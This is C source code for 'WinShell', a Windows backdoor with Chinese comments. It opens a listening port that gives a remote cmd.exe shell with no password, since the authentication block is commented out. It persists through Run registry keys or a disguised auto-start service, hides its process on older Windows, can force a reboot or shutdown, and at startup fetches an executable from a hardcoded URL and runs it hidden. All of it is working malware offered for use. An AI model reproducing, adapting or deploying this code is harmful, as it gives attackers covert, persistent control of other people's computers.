#include "stdafx.h"
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>
#include <winsvc.h>
#include <urlmon.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "urlmon.lib")

#define MAX_USER     999  // max clients
#define BUF_SOCK     200  // sock buffer
#define KEY_BUFF     255  // input buffer

#define REBOOT       0    // Reboot
#define SHUTDOWN     1    // Shutdown
 
#define DEF_PORT     5277 // listening port

#define REG_LEN      16   // registry key length
#define SVC_LEN      80   // nt service name length

// define winapi to use from dll
typedef DWORD 
(WINAPI pREGISTERSERVICEPROCESS) (DWORD,DWORD);
typedef LONG  
(WINAPI *PROCNTQSIP)(HANDLE,UINT,PVOID,ULONG,PULONG);
typedef BOOL  (WINAPI *ENUMPROCESSMODULES) (HANDLE hProcess, HMODULE * lphModule, DWORD cb, LPDWORD lpcbNeeded);
typedef DWORD (WINAPI *GETMODULEBASENAME) (HANDLE hProcess, HMODULE hModule, LPTSTR lpBaseName, DWORD nSize);

//定义管道提结构
struct SESSION_DATA {
    HANDLE  ReadPipeHandle;
    HANDLE  WritePipeHandle;
    HANDLE  ProcessHandle;
    SOCKET  ClientSocket;
    HANDLE  ReadShellThreadHandle;
    HANDLE  WriteShellThreadHandle;
};

// 定义初始化配置
struct WSCFG {
    int  ws_port;             // listening port
    char ws_passstr[REG_LEN]; // password string
    int  ws_autoins;          // autoinstall flag, 1=yes 0=no
    char ws_regname[REG_LEN]; // registry subkey name
    char ws_svcname[REG_LEN]; // ntservice name
    char ws_svcdisp[SVC_LEN]; // ntervice show name
    char ws_svcdesc[SVC_LEN]; // ntservice descripition Name
    char ws_passmsg[SVC_LEN]; // password prompt message
	int  ws_downexe;          // downexec flag, 1=yes 0=no
	char ws_fileurl[SVC_LEN]; // downfile url, "http://xxx/file.exe"
	char ws_filenam[SVC_LEN]; // downsave filename
};
// 初始化参数设置
struct WSCFG wscfg={DEF_PORT,
				    "1234",
				    1,
				    "winshell",
				    "winshell",
               "WinShell Service",
				    "Provide Windows CmdShell Service",
				    "Password: ",
					1,
					"http://www.janker.org/winshell.exe",
					"winshell.exe"
				   };

// message define area
char *msg_ws_copyright="\n\rWinShell v5.0 (C)2002 janker.org\n\r";
char *msg_ws_prompt="\n\r? for help\n\rCMD>";
char *msg_ws_cmd="\n\ri Install\n\rr Remove\n\rp Path\n\rb reBoot\n\rd shutDown\n\rs Shell\n\rx eXit\n\rq Quit\n\r\n\rDownload:\n\rCMD>http://.../srv.exe\n\r";
char *msg_ws_ext="\n\rExit.";
char *msg_ws_end="\n\rQuit.";
char *msg_ws_boot="\n\rReboot...";
char *msg_ws_poff="\n\rShutdown...";
char *msg_ws_down="\n\rSave to ";
char *msg_ws_err="\n\rErr!";
char *msg_ws_ok="\n\rOK!";
char ExeFile[MAX_PATH];
int nUser = 0;
HANDLE handles[MAX_USER];
int OsIsNt;
SERVICE_STATUS          serviceStatus;
SERVICE_STATUS_HANDLE   hServiceStatusHandle;

// 函数
int Install(void);
int Uninstall(void);
int DownloadFile(char *sURL, SOCKET wsh);
int Boot(int flag);
void HideProc(void);
int GetOsVer(void);
int WinShell(SOCKET wsl);
void TalkWithClient(void *cs);
int CmdShell(SOCKET sock);
int StartFromService(void);
int StartWinShell(LPSTR lpCmdLine);
static HANDLE StartShell(HANDLE StdinPipeHandle,HANDLE StdoutPipeHandle);
static VOID SessionReadShellThreadFn(LPVOID Parameter);
static VOID SessionWriteShellThreadFn(LPVOID Parameter);
VOID WINAPI NTServiceMain( DWORD dwArgc, LPTSTR *lpszArgv );
VOID WINAPI NTServiceHandler( DWORD fdwControl );
// configuration data and tables
SERVICE_TABLE_ENTRY DispatchTable[] =
{
	{wscfg.ws_svcname, NTServiceMain},
	{NULL, NULL}
};

// 自安装部分
int Install(void)
{
    char svExeFile[MAX_PATH];
    HKEY key;
    strcpy(svExeFile,ExeFile);

	// 如果是win9x系统则写注册表启动
	if(!OsIsNt) {
		if(RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&key)==ERROR_SUCCESS) {
			RegSetValueEx(key,wscfg.ws_regname,0,REG_SZ,(BYTE *)svExeFile,lstrlen(svExeFile));
			RegCloseKey(key);
			if(RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",&key)==ERROR_SUCCESS) {
				RegSetValueEx(key,wscfg.ws_regname,0,REG_SZ,(BYTE *)svExeFile,lstrlen(svExeFile));
				RegCloseKey(key);
				return 0;
	    	}
    	}
	}
	else {

		// 如果是nt系统则写服务
		SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE);
		if (schSCManager!=0)
		{
			SC_HANDLE schService = CreateService
			(
				schSCManager,
				wscfg.ws_svcname,
				wscfg.ws_svcdisp,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS ,
				SERVICE_AUTO_START,
				SERVICE_ERROR_NORMAL,
				svExeFile,
				NULL,
				NULL,
				NULL,
				NULL,
				NULL
			);
			if (schService!=0)
			{
				CloseServiceHandle(schService);
				CloseServiceHandle(schSCManager);
				strcpy(svExeFile,"SYSTEM\\CurrentControlSet\\Services\\");
				strcat(svExeFile,wscfg.ws_svcname);
				if(RegOpenKey(HKEY_LOCAL_MACHINE,svExeFile,&key)==ERROR_SUCCESS) {
					RegSetValueEx(key,"Description",0,REG_SZ,(BYTE *)wscfg.ws_svcdesc,lstrlen(wscfg.ws_svcdesc));
					RegCloseKey(key);
					return 0;
    			}
			}
			CloseServiceHandle(schSCManager);
		}
	}

	return 1;
}

// 卸载服务部分
int Uninstall(void)
{
    HKEY key;

	if(!OsIsNt) {
		if(RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&key)==ERROR_SUCCESS) {
			RegDeleteValue(key,wscfg.ws_regname);
			RegCloseKey(key);
			if(RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",&key)==ERROR_SUCCESS) {
				RegDeleteValue(key,wscfg.ws_regname);
				RegCloseKey(key);
				return 0;
			}
		}
	}
	else {

		SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (schSCManager!=0)
		{
			SC_HANDLE schService = OpenService( schSCManager, wscfg.ws_svcname, SERVICE_ALL_ACCESS);
			if (schService!=0)
			{
				if(DeleteService(schService)!=0) {
					CloseServiceHandle(schService);
					CloseServiceHandle(schSCManager);
					return 0;
				}
				CloseServiceHandle(schService);
			}
			CloseServiceHandle(schSCManager);
		}
	}

	return 1;
}

// 从目标网络下载文件
int DownloadFile(char *sURL, SOCKET wsh)
{
    HRESULT hr;
	char seps[]= "/";
	char *token;
	char *file;
	char myURL[MAX_PATH];
	char myFILE[MAX_PATH];

	strcpy(myURL,sURL);
    token=strtok(myURL,seps);
  	while(token!=NULL)
    {
        file=token;
	    token=strtok(NULL,seps);
    }

	GetCurrentDirectory(MAX_PATH,myFILE);
	strcat(myFILE, "\\");
	strcat(myFILE, file);
    send(wsh,myFILE,strlen(myFILE),0);
	send(wsh,"...",3,0);
	hr = URLDownloadToFile(0, sURL, myFILE, 0, 0);
    if(hr==S_OK)
		return 0;
	else
		return 1;

}

// 系统自动启动
int Boot(int flag)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if(OsIsNt) {
	    OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,(PTOKEN_PRIVILEGES)NULL, 0);
		if(flag==REBOOT) {
			if(ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0))
				return 0;
		}
		else {
			if(ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0))
				return 0;
		}
    }
    else {
		if(flag==REBOOT) {
			if(ExitWindowsEx(EWX_REBOOT + EWX_FORCE,0))
				return 0;
		}
		else {
			if(ExitWindowsEx(EWX_SHUTDOWN + EWX_FORCE,0))
				return 0;
		}
	}

	return 1;
}

// 隐藏进程
void HideProc(void)
{

    HINSTANCE hKernel=LoadLibrary("Kernel32.dll");
    if ( hKernel != NULL )
    {
		pREGISTERSERVICEPROCESS *pRegisterServiceProcess=(pREGISTERSERVICEPROCESS *)GetProcAddress(hKernel,"RegisterServiceProcess");
        ( *pRegisterServiceProcess)(GetCurrentProcessId(),1);
        FreeLibrary(hKernel);
    }

	return;
}

// 得到操作系统版本
int GetOsVer(void)
{
    OSVERSIONINFO winfo;
    winfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
    GetVersionEx(&winfo);
    if(winfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
    	return 1;
    else
    	return 0;
}

// handle client routine
int WinShell(SOCKET wsl)
{
    SOCKET wsh;
    struct sockaddr_in client;
    DWORD myID;

    while(nUser<MAX_USER)
	{
	    int nSize=sizeof(client);
        wsh=accept(wsl,(struct sockaddr *)&client,&nSize);
	    if(wsh==INVALID_SOCKET) return 1;

		handles[nUser]=CreateThread(0,1000,(LPTHREAD_START_ROUTINE) TalkWithClient,(VOID *) wsh, 0, &myID);
		if(handles[nUser]==0)
			closesocket(wsh);
		else
			nUser++;
    }
    WaitForMultipleObjects(MAX_USER,handles,TRUE,INFINITE);

    return 0;
}

// close socket
void CloseIt(SOCKET wsh)
{
	closesocket(wsh);
	nUser--;
	ExitThread(0);
}

// handle the client request
void TalkWithClient(void *cs)
{

    SOCKET wsh=(SOCKET)cs;
    char pwd[SVC_LEN];
    char cmd[KEY_BUFF];
	char chr[1];
	int i,j;

    while (nUser < MAX_USER) {
/*为了测试方便把密码部分注销
		if(wscfg.ws_passstr) {
			if(strlen(wscfg.ws_passmsg)) send(wsh,wscfg.ws_passmsg,strlen(wscfg.ws_passmsg),0);
			ZeroMemory(pwd,KEY_BUFF);
       		i=0;
			while(i<SVC_LEN) {

				// set timeout
				fd_set FdRead;
				struct timeval TimeOut;
				FD_ZERO(&FdRead);
				FD_SET(wsh,&FdRead);
				TimeOut.tv_sec=6;
				TimeOut.tv_usec=0;
				int Er=select(wsh+1, &FdRead, NULL, NULL, &TimeOut);
				if((Er==SOCKET_ERROR) || (Er==0)) CloseIt(wsh);

				if(recv(wsh,chr,1,0)==SOCKET_ERROR) CloseIt(wsh);
				pwd[i]=chr[0];
				if(chr[0]==0xd || chr[0]==0xa) {
					pwd[i]=0;
					break;
				}
				i++;
		    }

			// if invalid user, close the socket
           	if(strcmp(pwd,wscfg.ws_passstr)) CloseIt(wsh);
		}
		*/
		//注销结束

		send(wsh,msg_ws_copyright,strlen(msg_ws_copyright),0);
	    send(wsh,msg_ws_prompt,strlen(msg_ws_prompt),0);

		while(1) {

			ZeroMemory(cmd,KEY_BUFF);

       		// auto support standard telnet client			
			j=0;
			while(j<KEY_BUFF)
			{
				if(recv(wsh,chr,1,0)==SOCKET_ERROR) CloseIt(wsh);
				cmd[j]=chr[0];
				if(chr[0]==0xa || chr[0]==0xd) 
				{
					cmd[j]=0;
					break;
				}
				j++;
		    }

			// 下载文件
			if(strstr(cmd,"http://"))
			{
				send(wsh,msg_ws_down,strlen(msg_ws_down),0);
				if(DownloadFile(cmd,wsh))
					send(wsh,msg_ws_err,strlen(msg_ws_err),0);
				else
					send(wsh,msg_ws_ok,strlen(msg_ws_ok),0);
			}
			else
			{
		    	switch(cmd[0])
				{
					// help
					case '?': {
  			    		send(wsh,msg_ws_cmd,strlen(msg_ws_cmd),0);
						break;
					}
					// install
					case 'i': {
						if(Install())
							send(wsh,msg_ws_err,strlen(msg_ws_err),0);
						else
							send(wsh,msg_ws_ok,strlen(msg_ws_ok),0);
						break;
		    		}
					// 卸载参数
					case 'r': {
						if(Uninstall())
							send(wsh,msg_ws_err,strlen(msg_ws_err),0);
						else
							send(wsh,msg_ws_ok,strlen(msg_ws_ok),0);
						break;
		    		}
					// 显示winshell路径
					case 'p': {
						char svExeFile[MAX_PATH];
						strcpy(svExeFile,"\n\r");
   						strcat(svExeFile,ExeFile);
        				send(wsh,svExeFile,strlen(svExeFile),0);
						break;
		    		}
					// 重启
					case 'b': {
						send(wsh,msg_ws_boot,strlen(msg_ws_boot),0);
						if(Boot(REBOOT))
							send(wsh,msg_ws_err,strlen(msg_ws_err),0);
						else {
							closesocket(wsh);
							ExitThread(0);
						}
						break;
		    		}
					// 关机
					case 'd': {
						send(wsh,msg_ws_poff,strlen(msg_ws_poff),0);
						if(Boot(SHUTDOWN))
							send(wsh,msg_ws_err,strlen(msg_ws_err),0);
						else {
							closesocket(wsh);
							ExitThread(0);
						}
						break;
		    		}
					// 使用cmd 命令
					case 's': {
						CmdShell(wsh);
						closesocket(wsh);
						ExitThread(0);
						break;
					}
					// 退出
					case 'x': {
						send(wsh,msg_ws_ext,strlen(msg_ws_ext),0);
						CloseIt(wsh);
						break;
		    		}
					// 关闭连接
					case 'q': {
						send(wsh,msg_ws_end,strlen(msg_ws_end),0);
						closesocket(wsh);
						WSACleanup();
						exit(1);
						break;
            		}
				}
			}

			// prompt message
	    	if(strlen(cmd)) 
				send(wsh,msg_ws_prompt,strlen(msg_ws_prompt),0);
		}
    } 

    return;
}

// create pipe routine
struct SESSION_DATA* CreateSession(void)
{
    struct SESSION_DATA* Session;
    SECURITY_ATTRIBUTES SA;
    HANDLE ShellStdinPipe = NULL;
    HANDLE ShellStdoutPipe = NULL;

    Session=(struct SESSION_DATA*)malloc(sizeof(struct SESSION_DATA));

    Session->ReadPipeHandle  = NULL;
    Session->WritePipeHandle = NULL;

    SA.nLength = sizeof(SA);
    SA.lpSecurityDescriptor = NULL;
    SA.bInheritHandle = TRUE;

    if(!CreatePipe(&Session->ReadPipeHandle, &ShellStdoutPipe,&SA, 0)) {
		if(Session->ReadPipeHandle != NULL) CloseHandle(Session->ReadPipeHandle);
		if(ShellStdoutPipe != NULL)			CloseHandle(ShellStdoutPipe);
		free(Session);
		return NULL;
    }

    if(!CreatePipe(&ShellStdinPipe, &Session->WritePipeHandle,&SA, 0)) {
		if(Session->ReadPipeHandle != NULL) CloseHandle(Session->ReadPipeHandle);
		if(ShellStdoutPipe != NULL) CloseHandle(ShellStdoutPipe);
		if(Session->WritePipeHandle != NULL) CloseHandle(Session->WritePipeHandle);
		if(ShellStdinPipe != NULL) CloseHandle(ShellStdinPipe);
		free(Session);
		return NULL;
    }

    Session->ProcessHandle = StartShell(ShellStdinPipe, ShellStdoutPipe);
    CloseHandle(ShellStdinPipe);
    CloseHandle(ShellStdoutPipe);

    return(Session);
}

// handle cmdshell routine
int CmdShell(SOCKET  sock)
{
    SECURITY_ATTRIBUTES SecurityAttributes;
    DWORD ThreadId;
    HANDLE HandleArray[3];
    int i;

    SOCKET client = (SOCKET)sock;
    struct SESSION_DATA* Session;

    Session=(struct SESSION_DATA*)malloc(sizeof(struct SESSION_DATA));
    Session= CreateSession();

    SecurityAttributes.nLength = sizeof(SecurityAttributes);
    SecurityAttributes.lpSecurityDescriptor = NULL;
    SecurityAttributes.bInheritHandle = FALSE;

    Session->ClientSocket = client;
    Session->ReadShellThreadHandle = CreateThread(&SecurityAttributes, 0, (LPTHREAD_START_ROUTINE) SessionReadShellThreadFn, (LPVOID) Session, 0, &ThreadId);

    if (Session->ReadShellThreadHandle == NULL)	{
        Session->ClientSocket = INVALID_SOCKET;
        return 1;
    }

    Session->WriteShellThreadHandle = CreateThread(&SecurityAttributes, 0, (LPTHREAD_START_ROUTINE) SessionWriteShellThreadFn, (LPVOID) Session, 0, &ThreadId);

    if (Session->WriteShellThreadHandle == NULL) {
		Session->ClientSocket = INVALID_SOCKET;
        TerminateThread(Session->WriteShellThreadHandle, 0);
        return 1;
    }

    HandleArray[0] = Session->ReadShellThreadHandle;
    HandleArray[1] = Session->WriteShellThreadHandle;
    HandleArray[2] = Session->ProcessHandle;

    i = WaitForMultipleObjects(3, HandleArray, FALSE, 0xffffffff);

	switch (i) {
        case WAIT_OBJECT_0 + 0:
            TerminateThread(Session->WriteShellThreadHandle, 0);
            TerminateProcess(Session->ProcessHandle, 1);
            break;
        case WAIT_OBJECT_0 + 1:
            TerminateThread(Session->ReadShellThreadHandle, 0);
            TerminateProcess(Session->ProcessHandle, 1);
            break;
        case WAIT_OBJECT_0 + 2:
            TerminateThread(Session->WriteShellThreadHandle, 0);
            TerminateThread(Session->ReadShellThreadHandle, 0);
            break;
	default:
            break;
    }

    closesocket(Session->ClientSocket);
    DisconnectNamedPipe(Session->ReadPipeHandle);
    CloseHandle(Session->ReadPipeHandle);
    DisconnectNamedPipe(Session->WritePipeHandle);
    CloseHandle(Session->WritePipeHandle);
    CloseHandle(Session->ReadShellThreadHandle);
    CloseHandle(Session->WriteShellThreadHandle);
    CloseHandle(Session->ProcessHandle);

    if(Session != NULL)	free(Session);

	nUser--;

    return 0;
}

// 开始cmdshell
static HANDLE StartShell(HANDLE ShellStdinPipeHandle, HANDLE ShellStdoutPipeHandle)
{
    PROCESS_INFORMATION ProcessInformation;
    STARTUPINFO si;
    HANDLE ProcessHandle = NULL;
    char CmdShell[12];

    si.cb = sizeof(STARTUPINFO);
    si.lpReserved = NULL;
    si.lpTitle = NULL;
    si.lpDesktop = NULL;
    si.dwX = si.dwY = si.dwXSize = si.dwYSize = 0L;
    si.wShowWindow = SW_HIDE;
    si.lpReserved2 = NULL;
    si.cbReserved2 = 0;

    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    si.hStdInput  = ShellStdinPipeHandle;
    si.hStdOutput = ShellStdoutPipeHandle;

    DuplicateHandle(GetCurrentProcess(), ShellStdoutPipeHandle, GetCurrentProcess(), &si.hStdError, DUPLICATE_SAME_ACCESS, TRUE, 0);

    if(OsIsNt)
		// if nt
        strcpy(CmdShell,"cmd.exe");
    else
		// if win9x
		strcpy(CmdShell,"command.com");
    if (CreateProcess(NULL, CmdShell, NULL, NULL, TRUE, 0, NULL, NULL, &si, &ProcessInformation)) {
        ProcessHandle = ProcessInformation.hProcess;
        CloseHandle(ProcessInformation.hThread);
    }

    return(ProcessHandle);
}

// handle piperead routine
static VOID SessionReadShellThreadFn(LPVOID Parameter)
{
    struct SESSION_DATA* Session;

    BYTE    Buffer[BUF_SOCK];
    BYTE    Buffer2[BUF_SOCK+30];
    DWORD   BytesRead;

    Session=(struct SESSION_DATA*)malloc(sizeof(struct SESSION_DATA));
    memcpy(Session,Parameter,sizeof(struct SESSION_DATA));

    while (PeekNamedPipe(Session->ReadPipeHandle, Buffer, sizeof(Buffer), &BytesRead, NULL, NULL)) {
		DWORD BufferCnt, BytesToWrite;
        BYTE PrevChar = 0;
        if (BytesRead > 0)
	    	ReadFile(Session->ReadPipeHandle, Buffer, sizeof(Buffer), &BytesRead, NULL);
        else {
  	    	Sleep(50);
	    	continue;
		}
        for (BufferCnt = 0, BytesToWrite = 0; BufferCnt < BytesRead; BufferCnt++) {
            if (Buffer[BufferCnt] == '\n' && PrevChar != '\r')
                Buffer2[BytesToWrite++] = '\r';
            PrevChar = Buffer2[BytesToWrite++] = Buffer[BufferCnt];
        }

        if (send(Session->ClientSocket, (char*)Buffer2, BytesToWrite, 0) <= 0)
            break;
    }

    if(GetLastError()!= ERROR_BROKEN_PIPE) {;}

    free(Session);
    ExitThread(0);
}

// handle pipewrite routine
static VOID SessionWriteShellThreadFn(LPVOID Parameter)
{
    struct SESSION_DATA* Session;
    BYTE    RecvBuffer[1];
    BYTE    Buffer[BUF_SOCK];
    BYTE    EchoBuffer[5];
    DWORD   BytesWritten;
    DWORD   BufferCnt, EchoCnt;
    DWORD   TossCnt = 0;
    BOOL    PrevWasFF = FALSE;

    Session=(struct SESSION_DATA*)malloc(sizeof(struct SESSION_DATA));
    memcpy(Session,Parameter,sizeof(struct SESSION_DATA));

    BufferCnt = 0;
    while (recv(Session->ClientSocket, (char*)RecvBuffer, sizeof(RecvBuffer), 0) != INVALID_SOCKET) {
        EchoCnt = 0;
        Buffer[BufferCnt++] = EchoBuffer[EchoCnt++] = RecvBuffer[0];
        if (RecvBuffer[0] == '\r')
                Buffer[BufferCnt++] = EchoBuffer[EchoCnt++] = '\n';
		if (strnicmp((char*)Buffer, "exit\r\n", 6) == 0) {
			free(Session);
	    	ExitThread(0);
		}
        if (RecvBuffer[0] == '\n' || RecvBuffer[0] == '\r') {
            if (! WriteFile(Session->WritePipeHandle, Buffer, BufferCnt, &BytesWritten, NULL)) break;
            BufferCnt = 0;
        }
    }

    free(Session);
    ExitThread(0);
}

// check selfstart mode
int StartFromService(void)
{
	typedef struct
	{
	    DWORD ExitStatus;
	    DWORD PebBaseAddress;
	    DWORD AffinityMask;
	    DWORD BasePriority;
	    ULONG UniqueProcessId;
	    ULONG InheritedFromUniqueProcessId;
	}   PROCESS_BASIC_INFORMATION;

	PROCNTQSIP NtQueryInformationProcess;

	static ENUMPROCESSMODULES g_pEnumProcessModules = NULL ;
	static GETMODULEBASENAME g_pGetModuleBaseName = NULL ;

    HANDLE                    hProcess;
    PROCESS_BASIC_INFORMATION pbi;

    HINSTANCE hInst = LoadLibraryA("PSAPI.DLL");
    if(NULL == hInst ) return 0;

    g_pEnumProcessModules = (ENUMPROCESSMODULES)GetProcAddress(hInst ,"EnumProcessModules");
    g_pGetModuleBaseName = (GETMODULEBASENAME)GetProcAddress(hInst, "GetModuleBaseNameA");
    NtQueryInformationProcess = (PROCNTQSIP)GetProcAddress(GetModuleHandle("ntdll"), "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) return 0;

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,GetCurrentProcessId());
    if(!hProcess)  return 0;

    if(NtQueryInformationProcess( hProcess, 0, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL)) return 0;

    CloseHandle(hProcess);

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pbi.InheritedFromUniqueProcessId);
	if(hProcess==NULL)	return 0;

	HMODULE hMod;
	char procName[255];
	unsigned long cbNeeded;

	if(g_pEnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) g_pGetModuleBaseName(hProcess, hMod, procName, sizeof(procName));

    CloseHandle(hProcess);

	if(strstr(procName,"services")) return 1; // start from ntservice

    return 0; // start from application
}

// main routine
int StartWinShell(LPSTR lpCmdLine)
{
    SOCKET wsl;
    int port=0;
    struct sockaddr_in door;

    if(wscfg.ws_autoins) Install();

	port=atoi(lpCmdLine);

	if(port<=0) port=wscfg.ws_port;

    WSADATA data;
    if(WSAStartup(MAKEWORD(1,1),&data)!=0) return 1;

    if((wsl = socket(PF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) return 1;
    door.sin_family = PF_INET;
    door.sin_addr.s_addr = htonl(INADDR_ANY);
    door.sin_port = htons(port);

    if(bind(wsl, (const struct sockaddr *) &door,sizeof(door)) == INVALID_SOCKET) {
		closesocket(wsl);
		return 1;
	}

    if(listen(wsl, SOMAXCONN) == INVALID_SOCKET) {
		closesocket(wsl);
		return 1;
	}

    WinShell(wsl);

    WSACleanup();

	return 0;

}

// start from NT service
VOID WINAPI NTServiceMain( DWORD dwArgc, LPSTR *lpszArgv )
{
	DWORD   status = 0;
    DWORD   specificError = 0xfffffff;

    serviceStatus.dwServiceType        = SERVICE_WIN32;
    serviceStatus.dwCurrentState       = SERVICE_START_PENDING;
    serviceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
    serviceStatus.dwWin32ExitCode      = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint         = 0;
    serviceStatus.dwWaitHint           = 0;

    hServiceStatusHandle = RegisterServiceCtrlHandler(wscfg.ws_svcname, NTServiceHandler);
    if (hServiceStatusHandle==0) return;

	status = GetLastError();
    if (status!=NO_ERROR)
	{
        serviceStatus.dwCurrentState       = SERVICE_STOPPED;
        serviceStatus.dwCheckPoint         = 0;
        serviceStatus.dwWaitHint           = 0;
        serviceStatus.dwWin32ExitCode      = status;
        serviceStatus.dwServiceSpecificExitCode = specificError;
        SetServiceStatus(hServiceStatusHandle, &serviceStatus);
        return;
    }

    serviceStatus.dwCurrentState       = SERVICE_RUNNING;
    serviceStatus.dwCheckPoint         = 0;
    serviceStatus.dwWaitHint           = 0;
    if(SetServiceStatus(hServiceStatusHandle, &serviceStatus)) StartWinShell("");
}

// handle ntservice events like start or stop
VOID WINAPI NTServiceHandler(DWORD fdwControl)
{
	switch(fdwControl)
	{
		case SERVICE_CONTROL_STOP:
			serviceStatus.dwWin32ExitCode = 0;
			serviceStatus.dwCurrentState  = SERVICE_STOPPED;
			serviceStatus.dwCheckPoint    = 0;
			serviceStatus.dwWaitHint      = 0;
			{
				SetServiceStatus(hServiceStatusHandle, &serviceStatus);
			}
			return;
		case SERVICE_CONTROL_PAUSE:
			serviceStatus.dwCurrentState = SERVICE_PAUSED;
			break;
		case SERVICE_CONTROL_CONTINUE:
			serviceStatus.dwCurrentState = SERVICE_RUNNING;
			break;
		case SERVICE_CONTROL_INTERROGATE:
			break;
	};
    SetServiceStatus(hServiceStatusHandle,  &serviceStatus);
}

// standard application main
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
{

	// get OS version
	OsIsNt=GetOsVer();
	GetModuleFileName(NULL,ExeFile,MAX_PATH);

    // Install from cmdline
    if(strpbrk(lpCmdLine,"iI")) 
		Install();

    // if need, to download file and execute it
	if(wscfg.ws_downexe) 
	{
		if(URLDownloadToFileA(0, wscfg.ws_fileurl, wscfg.ws_filenam, 0, 0)==S_OK)
			WinExec(wscfg.ws_filenam,SW_HIDE);
	}

	if(!OsIsNt) 
	{
		// if win9x, hide process and start as application
		HideProc();		
		StartWinShell(lpCmdLine);
	}
	else
	    if(StartFromService())
			// start as ntservice
			StartServiceCtrlDispatcher(DispatchTable);
		else
			// start as application
			StartWinShell(lpCmdLine);

	return 0;
}
